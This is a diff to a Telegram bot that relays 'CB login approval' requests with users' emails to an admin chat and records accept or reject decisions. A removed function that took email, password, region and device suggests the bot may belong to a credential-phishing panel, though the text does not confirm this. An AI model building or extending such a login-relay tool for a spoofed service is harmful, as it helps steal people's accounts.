@@ -1,57 +1,69 @@
-// bot.js
 import TelegramBot from "node-telegram-bot-api";
-import { pendingApprovals } from "./server.js"; // import pending approvals object
+import fetch from "node-fetch";
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const APP_URL = process.env.APP_URL;
 
-if (!BOT_TOKEN || !CHAT_ID) {
-  console.error("Missing BOT_TOKEN or CHAT_ID in environment");
+if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
+  console.error("Missing BOT_TOKEN, ADMIN_CHAT_ID, or APP_URL in environment");
   process.exit(1);
 }
 
 // Initialize bot
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// Function to send backend login approval message
-export async function sendLoginTelegram(email, password, region, device) {
-  const message = `<b>CB login approval</b>\n\n<b>Email:</b> ${email}`;
+// -----------------
+// CB Login approval
+// -----------------
+export function sendCBLoginApproval(email) {
   const options = {
-    parse_mode: "HTML",
+    parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "✅ Accept", callback_data: `accept:${email}` },
-          { text: "❌ Reject", callback_data: `reject:${email}` }
+          { text: "✅ Accept", callback_data: `accept|${email}` },
+          { text: "❌ Reject", callback_data: `reject|${email}` }
         ]
       ]
     }
   };
 
-  try {
-    await bot.sendMessage(CHAT_ID, message, options);
-    console.log(`Backend approval message sent for ${email}`);
-  } catch (err) {
-    console.error("Failed to send backend Telegram message:", err);
-  }
+  const message = `*CB login approval*\n*Email:* ${email}`;
+  bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
 
-// Listen to button presses
+// -----------------
+// Handle button clicks
+// -----------------
 bot.on("callback_query", async (query) => {
-  const [action, email] = query.data.split(":");
-  if (!pendingApprovals[email]) return;
+  try {
+    const [action, email] = query.data.split("|");
+    const status = action === "accept" ? "accepted" : "rejected";
 
-  if (action === "accept") pendingApprovals[email].status = "accepted";
-  if (action === "reject") pendingApprovals[email].status = "rejected";
+    // Notify backend
+    await fetch(`${APP_URL}/update-status`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, status })
+    });
 
-  await bot.answerCallbackQuery(query.id, { text: `User ${action}ed.` });
-  
-  // Remove buttons after action
-  await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
-    chat_id: query.message.chat.id,
-    message_id: query.message.message_id
-  });
+    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
 
-  console.log(`Approval ${action} processed for ${email}`);
+    // Update message in Telegram
+    await bot.editMessageText(`*CB login approval*\n*Email:* ${email}\nStatus: *${status.toUpperCase()}*`, {
+      chat_id: query.message.chat.id,
+      message_id: query.message.message_id,
+      parse_mode: "Markdown"
+    });
+
+  } catch (err) {
+    console.error("❌ Failed to handle callback:", err);
+    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval for ${query.data}`);
+  }
 });
 
+// /start command
+bot.onText(/\/start/, (msg) => {
+  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
+});
